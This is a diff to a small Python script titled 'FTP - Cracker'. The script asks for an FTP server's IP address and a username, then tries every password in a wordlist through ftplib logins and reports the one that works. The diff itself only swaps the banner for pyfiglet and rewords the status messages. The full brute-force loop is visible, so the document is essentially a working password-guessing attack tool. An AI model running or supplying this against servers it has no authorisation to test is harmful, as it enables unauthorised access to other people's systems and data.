@@ -1,15 +1,8 @@
 #! /usr/bin/python
-
+import pyfiglet
 import ftplib
 
-print('''
- _____  _____  ____          ____                    _
-|  ___||_   _||  _ \        / ___| _ __  __ _   ___ | | __  ___  _ __
-| |_     | |  | |_) |_____ | |    | '__|/ _` | / __|| |/ / / _ \| '__|
-|  _|    | |  |  __/|_____|| |___ | |  | (_| || (__ |   < |  __/| |
-|_|      |_|  |_|           \____||_|   \__,_| \___||_|\_| \___||_|
-
-''')
+print(pyfiglet.figlet_format('FTP - Cracker'))
 
 # Take user input as to IP address of the FTP server
 server = input("What is the IP Address of the FTP server: ")
@@ -30,19 +23,19 @@ try:
 
         for word in pw:
             if word is not None:
-                word=word.strip('\r')
+                word=word.strip('\n')
 
                 try:
                     ftp=ftplib.FTP(server)
                     ftp.login(username,word)
-                    print ('Success! The password is ' +word)
+                    print ('[*] Success! You have connected to FTP server. The password is ' +word)
                     ftp.quit
 
                 except:
-                    print("Still trying...")
+                    print("[!] Still trying...")
 
             else:
-                print("Password not found!")
+                print("[!] Password not found")
 
 except:
     print("Please check the path of wordlist. Either the file does not exist or the wrong path")
